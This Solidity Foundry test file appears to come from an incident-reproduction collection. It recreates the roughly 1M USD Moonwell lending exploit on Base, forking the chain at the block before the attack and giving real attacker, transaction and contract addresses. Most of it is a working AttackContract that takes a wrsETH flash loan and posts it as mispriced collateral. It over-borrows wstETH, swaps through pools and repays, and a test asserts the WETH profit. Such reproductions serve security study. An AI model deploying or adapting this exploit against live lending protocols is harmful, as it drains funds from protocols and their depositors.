// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1M USD
// Attacker : https://basescan.org/address/0x6997a8c804642ae2de16d7b8ff09565a5d5658ff
// Attack Contract : https://basescan.org/address/0x42ecd332d47c91cbc83b39bd7f53cebe5e9734bb
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/base/0x190a491c0ef095d5447d6d813dc8e2ec11a5710e189771c24527393a2beb05ac

// @Info
// Vulnerable Contract Code : 

// @Analysis
// https://x.com/CertiKAlert/status/1985620452992253973
// https://finance.yahoo.com/news/moonwell-hack-1m-lost-chainlink-123012371.html
// https://www.halborn.com/blog/post/explained-the-moonwell-hack-november-2025

interface ICLFlashCallback {
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external;
}

interface ICLSwapCallback {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

interface ICLPool is ICLFlashCallback, ICLSwapCallback {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);

    function token0() external view returns (address);
    function token1() external view returns (address);

    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            bool unlocked
        );
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
}

interface ICErc20 {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

contract ContractTest is Test {
    // Pools
    address constant CLPOOL_WSTETH_WRSETH = 0x14dcCDd311Ab827c42CCA448ba87B1ac1039e2A4;
    address constant CLPOOL_WSTETH_WETH   = 0x861A2922bE165a5Bd41b1E482B49216b465e1B5F;
    address constant V3POOL_WRSETH_WETH  = 0x16e25fAcBA67a40dA3436ab9E2E00C30daB0dD97;

    // Tokens
    address constant WRSETH = 0xEDfa23602D0EC14714057867A78d01e94176BEA0; // rsETHWrapper (wrsETH) on Base
    address constant MW_RSETH = 0xfC41B49d064Ac646015b459C522820DB9472F4B5; // Moonwell mwrsETH cToken
    address constant MW_STETH = 0x627Fe393Bc6EdDA28e99AE648fD6fF362514304b;
    address constant WSTETH = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;  // wstETH on Base
    address constant WETH   = 0x4200000000000000000000000000000000000006;  // canonical WETH on Base

    // Moonwell Comptroller (Unitroller)
    address constant COMPTROLLER = 0xfBb21d0380beE3312B33c4353c8936a0F13EF26C;

    uint256 constant BLOCK = 37722882 - 1;

    AttackContract attacker;

    function setUp() public {
        vm.createSelectFork("base", BLOCK);
        vm.label(V3POOL_WRSETH_WETH, "UniswapV3Pool");
        vm.label(WRSETH, "wrsETH");
        vm.label(MW_RSETH, "mwrsETH");                
        vm.label(MW_STETH, "mwstETH");
        vm.label(WSTETH, "0xc1cb_wstETH");
        vm.label(WETH, "WETH");
        
        attacker = new AttackContract(
            CLPOOL_WSTETH_WRSETH,
            CLPOOL_WSTETH_WETH,
            V3POOL_WRSETH_WETH,
            WRSETH,
            MW_RSETH,
            MW_STETH,
            COMPTROLLER,
            WSTETH,
            WETH
        );

        vm.label(address(attacker), "Receiver");
    }

    function testExploit() public {
        uint256 wethBefore = IERC20(WETH).balanceOf(address(attacker));

        attacker.attack();

        uint256 wethAfter = IERC20(WETH).balanceOf(address(attacker));
        emit log_named_uint("WETH profit", wethAfter - wethBefore);

        assertGt(wethAfter, wethBefore);
    }
}

contract AttackContract is Test, ICLFlashCallback, ICLSwapCallback {
    uint256 internal constant FLASH_AMOUNT  = 20_782_357_954_960;
    uint256 internal constant BORROW_AMOUNT = 20_592_096_934_942_276_800;
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    ICLPool public clPoolWstEthWrsEth;
    ICLPool public clPoolWstEthWeth;
    ICLPool public v3PoolWrsEthWeth;
    
    IERC20  public wrsEth;
    ICErc20 public mwrsEth;
    ICErc20 public mwstEth;

    IComptroller public comptroller;

    IERC20  public wstEth;
    IERC20  public weth;

    constructor(
        address _clpoolWstEthWrsEth,
        address _clpoolWstEthWeth,
        address _v3poolWrsEthWeth,
        address _wrsEth,
        address _mwrsEth,
        address _mwstEth,
        address _comptroller,
        address _wstEth,
        address _weth
    ) {
        clPoolWstEthWrsEth = ICLPool(_clpoolWstEthWrsEth);
        clPoolWstEthWeth   = ICLPool(_clpoolWstEthWeth);
        v3PoolWrsEthWeth  = ICLPool(_v3poolWrsEthWeth);

        wrsEth  = IERC20(_wrsEth);
        mwrsEth = ICErc20(_mwrsEth);
        mwstEth = ICErc20(_mwstEth);
        comptroller = IComptroller(_comptroller);
        wstEth = IERC20(_wstEth);
        weth   = IERC20(_weth);
    }

    function attack() public {
        // take wrsETH flash loan from wstETH/wrsETH pool
        clPoolWstEthWrsEth.flash(
            address(this),
            0,                  // amount0 (wstETH)
            FLASH_AMOUNT,        // amount1 (wrsETH)
            bytes("")           
        );
        
        // swap remaining wrsETH to WETH to realize profit
        uint256 wrsEthBalance = wrsEth.balanceOf(address(this));
        v3PoolWrsEthWeth.swap(
            address(this),
            false,                      
            int256(wrsEthBalance),     
            MAX_SQRT_RATIO - 1,
            bytes("")
        );

        uint256 wethBalance = weth.balanceOf(address(this));
    }

    function uniswapV3FlashCallback(
        uint256,
        uint256 fee1,
        bytes calldata
    ) external override {
        require(msg.sender == address(clPoolWstEthWrsEth), "invalid flash caller");

        uint256 flashAmount = wrsEth.balanceOf(address(this));
        wrsEth.approve(address(mwrsEth), flashAmount);
        mwrsEth.mint(flashAmount);

        address[] memory markets = new address[](1);
        markets[0] = address(mwrsEth);
        comptroller.enterMarkets(markets);

        // over-borrow wstETH using the mispriced wrsETH collateral
        mwstEth.borrow(BORROW_AMOUNT);

        // swap borrowed wstETH -> WETH on wstETH/WETH pool
        uint256 wstBalance = wstEth.balanceOf(address(this));
        clPoolWstEthWeth.swap(
            address(this),
            false,                      
            int256(wstBalance),         
            MAX_SQRT_RATIO - 1,
            bytes("")
        );

        // swap WETH -> wrsETH on wrsETH/WETH UniswapV3 pool to get wrsETH to repay flash loan
        uint256 wethBalance = weth.balanceOf(address(this));
        v3PoolWrsEthWeth.swap(
            address(this),
            true,                      
            int256(wethBalance),     
            MIN_SQRT_RATIO + 1,
            bytes("")
        );

        // repay wrsETH flash loan + fee1 back to wstETH/wrsETH pool
        uint256 repayAmount = flashAmount + fee1;
        wrsEth.transfer(address(clPoolWstEthWrsEth), repayAmount);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external override {
        address token0;
        address token1;
        
        if (msg.sender == address(clPoolWstEthWeth)) {
            token0 = clPoolWstEthWeth.token0();
            token1 = clPoolWstEthWeth.token1();
        } else if (msg.sender == address(v3PoolWrsEthWeth)) {
            token0 = v3PoolWrsEthWeth.token0();
            token1 = v3PoolWrsEthWeth.token1();
        } else {
            revert("invalid swap caller");
        }

        if (amount0Delta > 0) {
            IERC20(token0).transfer(msg.sender, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            IERC20(token1).transfer(msg.sender, uint256(amount1Delta));
        }
    }
}


